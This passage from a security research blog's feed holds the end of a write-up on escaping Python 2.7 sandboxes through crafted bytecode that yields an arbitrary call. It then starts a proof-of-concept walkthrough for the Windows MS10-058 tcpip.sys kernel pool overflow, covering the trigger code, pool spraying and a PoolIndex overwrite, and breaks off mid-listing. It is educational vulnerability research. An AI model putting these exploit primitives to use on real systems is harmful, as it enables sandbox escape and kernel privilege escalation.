</span><span class='line'>    <span class="n">result</span> <span class="o">=</span> <span class="n">PyObject_Call</span><span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="n">callargs</span><span class="p">,</span> <span class="n">kwdict</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="n">PyObject</span> <span class="o">*</span>
</span><span class='line'><span class="n">PyObject_Call</span><span class="p">(</span><span class="n">PyObject</span> <span class="o">*</span><span class="n">func</span><span class="p">,</span> <span class="n">PyObject</span> <span class="o">*</span><span class="n">arg</span><span class="p">,</span> <span class="n">PyObject</span> <span class="o">*</span><span class="n">kw</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">ternaryfunc</span> <span class="n">call</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">call</span> <span class="o">=</span> <span class="n">func</span><span class="o">-&gt;</span><span class="n">ob_type</span><span class="o">-&gt;</span><span class="n">tp_call</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">PyObject</span> <span class="o">*</span><span class="n">result</span><span class="p">;</span>
</span><span class='line'>    <span class="c1">// Yay an interesting call :)</span>
</span><span class='line'>    <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">call</span><span class="p">)(</span><span class="n">func</span><span class="p">,</span> <span class="n">arg</span><span class="p">,</span> <span class="n">kw</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>So basically the idea to use <em>CALL_FUNCTION</em> was a good one, but we will need to craft two different objects:</p>

<ol>
<li>The first one will be a <em>PyObject</em> with <em>ob_type</em> pointing to the second object</li>
<li>The second object will be a <em>_typeobject</em> with <em>tp_call</em> the address you want to call</li>
</ol>


<p>This is fairly trivial to do and will give us an absolute-call primitive without crashing the interpreter: s.w.e.e.t.</p>

<figure class='code'><figcaption><span>absolute call via CALL_FUNCTION</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">opcode</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">types</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pshort</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;H&#39;</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">puint</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">a</span><span class="p">():</span>
</span><span class='line'>  <span class="k">pass</span>
</span><span class='line'>
</span><span class='line'><span class="n">PyStringObject_to_char_array_offset</span> <span class="o">=</span> <span class="mi">20</span>
</span><span class='line'><span class="n">second_object</span> <span class="o">=</span> <span class="s">&#39;A&#39;</span> <span class="o">*</span> <span class="mh">0x40</span> <span class="o">+</span> <span class="n">puint</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
</span><span class='line'><span class="n">addr_second_object</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">second_object</span><span class="p">)</span>
</span><span class='line'><span class="n">addr_second_object_controled_data</span> <span class="o">=</span> <span class="n">addr_second_object</span> <span class="o">+</span> <span class="n">PyStringObject_to_char_array_offset</span>
</span><span class='line'>
</span><span class='line'><span class="n">first_object</span> <span class="o">=</span> <span class="s">&#39;AAAA&#39;</span> <span class="o">+</span> <span class="n">puint</span><span class="p">(</span><span class="n">addr_second_object_controled_data</span><span class="p">)</span>
</span><span class='line'><span class="n">addr_first_object</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">first_object</span><span class="p">)</span>
</span><span class='line'><span class="n">addr_first_object_controled_data</span> <span class="o">=</span> <span class="n">addr_first_object</span> <span class="o">+</span> <span class="n">PyStringObject_to_char_array_offset</span>
</span><span class='line'>
</span><span class='line'><span class="n">consts</span> <span class="o">=</span> <span class="p">()</span>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">puint</span><span class="p">(</span><span class="n">addr_first_object_controled_data</span><span class="p">)</span>
</span><span class='line'><span class="n">address_s</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">+</span> <span class="n">PyStringObject_to_char_array_offset</span>
</span><span class='line'><span class="n">address_consts</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">consts</span><span class="p">)</span>
</span><span class='line'><span class="n">offset</span> <span class="o">=</span> <span class="p">((</span><span class="n">address_s</span> <span class="o">-</span> <span class="n">address_consts</span> <span class="o">-</span> <span class="mh">0xC</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
</span><span class='line'>
</span><span class='line'><span class="n">a</span><span class="o">.</span><span class="n">func_code</span> <span class="o">=</span> <span class="n">types</span><span class="o">.</span><span class="n">CodeType</span><span class="p">(</span>
</span><span class='line'>  <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
</span><span class='line'>  <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s">&#39;EXTENDED_ARG&#39;</span><span class="p">])</span>  <span class="o">+</span> <span class="n">pshort</span><span class="p">(</span><span class="n">offset</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span>     <span class="o">+</span>
</span><span class='line'>  <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s">&#39;LOAD_CONST&#39;</span><span class="p">])</span>    <span class="o">+</span> <span class="n">pshort</span><span class="p">(</span><span class="n">offset</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>  <span class="o">+</span>
</span><span class='line'>  <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s">&#39;CALL_FUNCTION&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="n">pshort</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span><span class='line'>  <span class="n">consts</span><span class="p">,</span> <span class="p">(),</span> <span class="p">(),</span> <span class="s">&#39;&#39;</span><span class="p">,</span> <span class="s">&#39;&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="p">)</span>
</span><span class='line'><span class="n">a</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>And we finally get our primitive working :&ndash;)</p>

<figure class='code'><figcaption><span>call 0xdeadbeef</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>(11d0.11cc): Access violation - code c0000005 (!!! second chance !!!)
</span><span class='line'>*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files (x86)\Python\Python275\python27.dll -
</span><span class='line'>eax=01cc1030 ebx=00000000 ecx=00422e78 edx=00000000 esi=deadbeef edi=02e62df4
</span><span class='line'>eip=deadbeef esp=0027e78c ebp=02e62df4 iopl=0         nv up ei ng nz na po cy
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010283
</span><span class='line'>deadbeef ??              ???
</span></code></pre></td></tr></table></div></figure>


<p>So now you know all the nasty things going under the hood with that <a href="https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/python27_abuse_vm_to_execute_x86_code.py">python27_abuse_vm_to_execute_x86_code.py</a> script!</p>

<h1>Conclusion, Ideas</h1>

<p>After reading this little post you are now aware that if you want to sandbox efficiently Python, you should do it outside of Python and not by preventing the use of some modules or things like that: this is broken by design. The virtual machine is not safe enough to build a strong sandbox inside Python, so don&rsquo;t rely on such thing if you don&rsquo;t want to get surprised. An article about that exact same thing was written here if you are interested: <a href="https://lwn.net/Articles/574215/">The failure of pysandbox</a>.</p>

<p>You also may want to look at <a href="http://pypy.org/features.html#sandboxing">PyPy&rsquo;s sandboxing capability</a> if you are interested in executing untrusted Python code. Otherwise, you can build your own <a href="https://code.google.com/p/seccompsandbox/wiki/overview">SECCOMP</a>-based system :).</p>

<p>On the other hand, I had a lot of fun taking a deep dive into Python&rsquo;s source code and I hope you had some too! If you would like to know more about the low level aspects of Python here are a list of interesting posts:</p>

<ul>
<li><a href="http://www.jmcneil.net/2012/04/debugging-your-python-with-gdb-ftw/">Debugging Your Python With GDB (FTW!)</a></li>
<li><a href="http://nedbatchelder.com/blog/200804/the_structure_of_pyc_files.html">The structure of .pyc files</a></li>
<li><a href="https://www.youtube.com/watch?v=ve7lLHtJ9l8">Bytecode: What, Why, and How to Hack it &ndash; Dr. Ryan F Kelly</a></li>
<li><a href="https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/wildfire.py">Self-modifying Python bytecode</a></li>
<li><a href="http://eli.thegreenplace.net/category/programming/python/python-internals/">Python internals series</a></li>
</ul>


<p>Folks, that&rsquo;s all for today ; don&rsquo;t hesitate to contact us if you have a cool post!</p>
]]></content>
    
  </entry>
  
  <entry>
    
    <title type="html"><![CDATA[First dip into the kernel pool : MS10-058]]></title>
    <link href="http://doar-e.github.io/blog/2014/03/11/first-dip-into-the-kernel-pool-ms10-058/"/>
    
    <updated>2014-03-11T02:52:37-07:00</updated>
    <id>http://doar-e.github.io/blog/2014/03/11/first-dip-into-the-kernel-pool-ms10-058</id>
    
    <content type="html"><![CDATA[<h1>Introduction</h1>

<p>I am currently playing with pool-based memory corruption vulnerabilities. That’s why I wanted to program a PoC exploit for the vulnerability presented by Tarjei Mandt during his first talk “Kernel Pool Exploitation on Windows 7” <a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf">[3]</a>. I think it&rsquo;s a good exercise to start learning about pool overflows.</p>

<h1>Forewords</h1>

<p>If you want to experiment with this vulnerability, you should read <a href="http://www.itsecdb.com/oval/definition/oval/gov.nist.USGCB.patch/def/11689/MS10-058-Vulnerabilities-in-TCP-IP-Could-Allow-Elevation-of.html">[1]</a> and be sure to have a vulnerable system. I tested my exploit on a VM with Windows 7 32 bits with tcpip.sys 6.1.7600.16385. The Microsoft bulletin dealing with this vulnerability is MS10-058. It has been found by Matthieu Suiche <a href="http://technet.microsoft.com/fr-fr/security/bulletin/ms10-058">[2]</a> and was used as an example on Tarjei Mandt’s paper <a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf">[3]</a>.</p>

<h1>Triggering the flaw</h1>

<p>An integer overflow in <em>tcpip!IppSortDestinationAddresses</em> allows to allocate a wrong-sized non-paged pool memory chunk. Below you can see the diff between the vulnerable version and the patched version.</p>

<p><img class="center" src="http://doar-e.github.io/images/MS10-058/diff.png"></p>

<div class='entry-content-toc'></div>




<!--more-->


<p>So basically the flaw is merely an integer overflow that triggers a pool overflow.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>IppSortDestinationAddresses(x,x,x)+29   imul    eax, 1Ch
</span><span class='line'>IppSortDestinationAddresses(x,x,x)+2C   push    esi
</span><span class='line'>IppSortDestinationAddresses(x,x,x)+2D   mov     esi, ds:__imp__ExAllocatePoolWithTag@12
</span><span class='line'>IppSortDestinationAddresses(x,x,x)+33   push    edi
</span><span class='line'>IppSortDestinationAddresses(x,x,x)+34   mov     edi, 73617049h
</span><span class='line'>IppSortDestinationAddresses(x,x,x)+39   push    edi
</span><span class='line'>IppSortDestinationAddresses(x,x,x)+3A   push    eax
</span><span class='line'>IppSortDestinationAddresses(x,x,x)+3B   push    ebx
</span><span class='line'>IppSortDestinationAddresses(x,x,x)+3C   call    esi ; ExAllocatePoolWithTag(x,x,x)
</span></code></pre></td></tr></table></div></figure>


<p>You can reach this code using a <em>WSAIoctl</em> with the code <em>SIO_ADDRESS_LIST_SORT</em> using a call like this :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>WSAIoctl(sock, SIO_ADDRESS_LIST_SORT, pwn, 0x1000, pwn, 0x1000, &amp;cb, NULL, NULL)
</span></code></pre></td></tr></table></div></figure>


<p>You have to pass the function a pointer to a <em>SOCKET_ADDRESS_LIST</em> (<em>pwn</em> in the example). This <em>SOCKET_ADDRESS_LIST</em> contains an <em>iAddressCount</em> field and <em>iAddressCount</em> <em>SOCKET_ADDRESS</em> structures. With a high <em>iAddressCount</em> value, the integer will wrap, thus triggering the wrong-sized allocation.  We can almost write anything in those structures. There are only two limitations :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>IppFlattenAddressList(x,x)+25   lea     ecx, [ecx+ebx*8]
</span><span class='line'>IppFlattenAddressList(x,x)+28   cmp     dword ptr [ecx+8], 1Ch
</span><span class='line'>IppFlattenAddressList(x,x)+2C   jz      short loc_4DCA9
</span><span class='line'>
</span><span class='line'>IppFlattenAddressList(x,x)+9C   cmp     word ptr [edx], 17h
</span><span class='line'>IppFlattenAddressList(x,x)+A0   jnz     short loc_4DCA2
</span></code></pre></td></tr></table></div></figure>


<p>The copy will stop if those checks fail. That means that each <em>SOCKET_ADDRESS</em> has a length of 0x1c and that each <em>SOCKADDR</em> buffer pointed to by the socket address begins with a 0x17 byte. Long story short :</p>

<ul>
<li>Make the multiplication at <em>IppSortDestinationAddresses+29</em> overflow</li>
<li>Get a non-paged pool chunk at <em>IppSortDestinationAddresses+3e</em> that is too little</li>
<li>Write user controlled memory to this chunk in <em>IppFlattenAddressList+67</em> and overflow as much as you want (provided that you take care of the 0x1c and 0x17 bytes)</li>
</ul>


<p>The code below should trigger a BSOD. Now the objective is to place an object after our vulnerable object and modify pool metadata.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>WSADATA wd = {0};
</span><span class='line'>SOCKET sock = 0;
</span><span class='line'>SOCKET_ADDRESS_LIST *pwn = (SOCKET_ADDRESS_LIST*)malloc(sizeof(INT) + 4 * sizeof(SOCKET_ADDRESS));
</span><span class='line'>DWORD cb;
</span><span class='line'>
</span><span class='line'>memset(buffer,0x41,0x1c);
</span><span class='line'>buffer[0] = 0x17;
</span><span class='line'>buffer[1] = 0x00;
</span><span class='line'>sa.lpSockaddr = (LPSOCKADDR)buffer;
</span><span class='line'>sa.iSockaddrLength = 0x1c;
</span><span class='line'>pwn-&gt;iAddressCount = 0x40000003;
</span><span class='line'>memcpy(&amp;pwn-&gt;Address[0],&amp;sa,sizeof(_SOCKET_ADDRESS));
</span><span class='line'>memcpy(&amp;pwn-&gt;Address[1],&amp;sa,sizeof(_SOCKET_ADDRESS));
</span><span class='line'>memcpy(&amp;pwn-&gt;Address[2],&amp;sa,sizeof(_SOCKET_ADDRESS));
</span><span class='line'>memcpy(&amp;pwn-&gt;Address[3],&amp;sa,sizeof(_SOCKET_ADDRESS));
</span><span class='line'>
</span><span class='line'>WSAStartup(MAKEWORD(2,0), &amp;wd)
</span><span class='line'>sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
</span><span class='line'>WSAIoctl(sock, SIO_ADDRESS_LIST_SORT, pwn, 0x1000, pwn, 0x1000, &amp;cb, NULL, NULL)
</span></code></pre></td></tr></table></div></figure>


<h1>Spraying the pool</h1>

<h2>Non paged objects</h2>

<p>There are several objects that we could easily use to manipulate the non-paged pool. For instance we could use semaphore objects or reserve objects.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>*8516b848 size:   48 previous size:   48  (Allocated) Sema
</span><span class='line'>*85242d08 size:   68 previous size:   68  (Allocated) User
</span><span class='line'>*850fcea8 size:   60 previous size:    8  (Allocated) IoCo
</span></code></pre></td></tr></table></div></figure>


<p>We are trying to overflow a pool chunk with a size being a multiple of 0x1c. As 0x1c*3=0x54, the driver is going to request 0x54 bytes and being therefore given a chunk of 0x60 bytes. This is exactly the size of an I/O completion reserve object. To allocate a IoCo, we just need to call <em>NtAllocateReserveObject</em> with the object type IOCO. To deallocate the IoCo, we could simply close the associate the handle. Doing this would make the object manager release the object. For more in-depth information about reserve objects, you can read j00ru’s article <a href="http://magazine.hitb.org/issues/HITB-Ezine-Issue-003.pdf">[4]</a>.</p>

<p>In order to spray, we are first going to allocate a lot of IoCo without releasing them so as to fill existing holes in the pool. After that, we want to allocate IoCo and make holes of 0x60 bytes. This is illustrated in the <em>sprayIoCo()</em> function of my PoC. Now we are able have an IoCo pool chunk following an Ipas pool chunk (as you might have noticed, ‘Ipas’ is the tag used by the tcpip driver). Therefore, we can easily corrupt its pool header.</p>

<h2>nt!PoolHitTag</h2>

<p>If you want to debug a specific call to <em>ExFreePoolWithTag</em> and simply break on it you’ll see that there are way too much frees (and above all, this is very slow when kernel debugging). A simple approach to circumvent this issue is to use pool hit tags.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>ExFreePoolWithTag(x,x)+62F                  and     ecx, 7FFFFFFFh
</span><span class='line'>ExFreePoolWithTag(x,x)+635                  mov     eax, ebx
</span><span class='line'>ExFreePoolWithTag(x,x)+637                  mov     ebx, ecx
</span><span class='line'>ExFreePoolWithTag(x,x)+639                  shl     eax, 3
</span><span class='line'>ExFreePoolWithTag(x,x)+63C                  mov     [esp+58h+var_28], eax
</span><span class='line'>ExFreePoolWithTag(x,x)+640                  mov     [esp+58h+var_2C], ebx
</span><span class='line'>ExFreePoolWithTag(x,x)+644                  cmp     ebx, _PoolHitTag
</span><span class='line'>ExFreePoolWithTag(x,x)+64A                  jnz     short loc_5180E9
</span><span class='line'>ExFreePoolWithTag(x,x)+64C                  int     3               ; Trap to Debugger
</span></code></pre></td></tr></table></div></figure>


<p>As you can see on the listing above, <em>nt!PoolHitTag</em> is compared against the pool tag of the currently freed chunk. Notice the mask : it allows you to use the raw tag. (for instance ‘oooo’ instead of 0xef6f6f6f) By the way, you are not required to use the genuine tag. (eg : you can use ‘ooo’ for ‘IoCo’) Now you know that you can <em>ed nt!PoolHitTag ‘oooo’</em> to debug your exploit.</p>

<h1>Exploitation technique</h1>

<h2>Basic structure</h2>

<p>As the internals of the pool are thoroughly detailed in Tarjei Mandt’s paper <a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf">[3]</a>, I will only be giving a glimpse at the pool descriptor and the pool header structures. The pool memory is divided into several types of pool. Two of them are the paged pool and the non-paged pool. A pool is described by a <em>_POOL_DESCRIPTOR</em> structure as seen below.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0: kd&gt; dt _POOL_TYPE
</span><span class='line'>ntdll!_POOL_TYPE
</span><span class='line'>   NonPagedPool = 0n0
</span><span class='line'>   PagedPool = 0n1
</span></code></pre></td></tr></table></div></figure>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0: kd&gt; dt _POOL_DESCRIPTOR
</span><span class='line'>nt!_POOL_DESCRIPTOR
</span><span class='line'>   +0x000 PoolType         : _POOL_TYPE
</span><span class='line'>   +0x004 PagedLock        : _KGUARDED_MUTEX
</span><span class='line'>   +0x004 NonPagedLock     : Uint4B
</span><span class='line'>   +0x040 RunningAllocs    : Int4B
</span><span class='line'>   +0x044 RunningDeAllocs  : Int4B
</span><span class='line'>   +0x048 TotalBigPages    : Int4B
</span><span class='line'>   +0x04c ThreadsProcessingDeferrals : Int4B
</span><span class='line'>   +0x050 TotalBytes       : Uint4B
</span><span class='line'>   +0x080 PoolIndex        : Uint4B
</span><span class='line'>   +0x0c0 TotalPages       : Int4B
</span><span class='line'>   +0x100 PendingFrees     : Ptr32 Ptr32 Void
</span><span class='line'>   +0x104 PendingFreeDepth : Int4B
</span><span class='line'>   +0x140 ListHeads        : [512] _LIST_ENTRY
</span></code></pre></td></tr></table></div></figure>


<p>A pool descriptor references free memory in a free list called <em>ListHeads</em>. The <em>PendingFrees</em> field references chunks of memory waiting to be freed to the free list. Pointers to pool descriptor structures are stored in arrays such as <em>PoolVector</em> (non-paged) or <em>ExpPagedPoolDescriptor</em> (paged). Each chunk of memory contains a header before the actual data. This is the <em>_POOL_HEADER</em>. It brings information such as the size of the block or the pool it belongs to.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0: kd&gt; dt _POOL_HEADER
</span><span class='line'>nt!_POOL_HEADER
</span><span class='line'>   +0x000 PreviousSize     : Pos 0, 9 Bits
</span><span class='line'>   +0x000 PoolIndex        : Pos 9, 7 Bits
</span><span class='line'>   +0x002 BlockSize        : Pos 0, 9 Bits
</span><span class='line'>   +0x002 PoolType         : Pos 9, 7 Bits
</span><span class='line'>   +0x000 Ulong1           : Uint4B
</span><span class='line'>   +0x004 PoolTag          : Uint4B
</span><span class='line'>   +0x004 AllocatorBackTraceIndex : Uint2B
</span><span class='line'>   +0x006 PoolTagHash      : Uint2B
</span></code></pre></td></tr></table></div></figure>


<h2>PoolIndex overwrite</h2>

<p>The basic idea of this attack is to corrupt the <em>PoolIndex</em> field of a pool header. This field is used when deallocating paged pool chunks in order to know which pool descriptor it belongs to. It is used as an index in an array of pointers to pool descriptors. Thus, if an attacker is able to corrupt it, he can make the pool manager believe that a specific chunk belongs to another pool descriptor. For instance, one could reference a pool descriptor out of the bounds of the array.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0: kd&gt; dd ExpPagedPoolDescriptor
</span><span class='line'>82947ae0  84835000 84836140 84837280 848383c0
</span><span class='line'>82947af0  84839500 00000000 00000000 00000000
</span></code></pre></td></tr></table></div></figure>


<p>As there are always some null pointers after the array, it could be used to craft a fake pool descriptor in a user-allocated null page.</p>

<h2>Non paged pool type</h2>

<p>To determine the <em>_POOL_DESCRIPTOR</em> to use, <em>ExFreePoolWithTag</em> gets the appropriate <em>_POOL_HEADER</em> and stores <em>PoolType</em> (<em>watchMe</em>) and <em>BlockSize</em> (<em>var_3c</em>)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>ExFreePoolWithTag(x,x)+465
</span><span class='line'>ExFreePoolWithTag(x,x)+465  loc_517F01:
</span><span class='line'>ExFreePoolWithTag(x,x)+465  mov     edi, esi
</span><span class='line'>ExFreePoolWithTag(x,x)+467  movzx   ecx, word ptr [edi-6]
</span><span class='line'>ExFreePoolWithTag(x,x)+46B  add     edi, 0FFFFFFF8h
</span><span class='line'>ExFreePoolWithTag(x,x)+46E  movzx   eax, cx
</span><span class='line'>ExFreePoolWithTag(x,x)+471  mov     ebx, eax
</span><span class='line'>ExFreePoolWithTag(x,x)+473  shr     eax, 9
</span><span class='line'>ExFreePoolWithTag(x,x)+476  mov     esi, 1FFh
</span><span class='line'>ExFreePoolWithTag(x,x)+47B  and     ebx, esi
</span><span class='line'>ExFreePoolWithTag(x,x)+47D  mov     [esp+58h+var_40], eax
</span><span class='line'>ExFreePoolWithTag(x,x)+481  and     eax, 1
</span><span class='line'>ExFreePoolWithTag(x,x)+484  mov     edx, 400h
</span><span class='line'>ExFreePoolWithTag(x,x)+489  mov     [esp+58h+var_3C], ebx
</span><span class='line'>ExFreePoolWithTag(x,x)+48D  mov     [esp+58h+watchMe], eax
</span><span class='line'>ExFreePoolWithTag(x,x)+491  test    edx, ecx
</span><span class='line'>ExFreePoolWithTag(x,x)+493  jnz     short loc_517F49
</span></code></pre></td></tr></table></div></figure>


<p>Later, if <em>ExpNumberOfNonPagedPools</em> equals 1, the correct pool descriptor will directly be taken from <em>nt!PoolVector[0]</em>. The PoolIndex is not used.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>ExFreePoolWithTag(x,x)+5C8  loc_518064:
</span><span class='line'>ExFreePoolWithTag(x,x)+5C8  mov     eax, [esp+58h+watchMe]
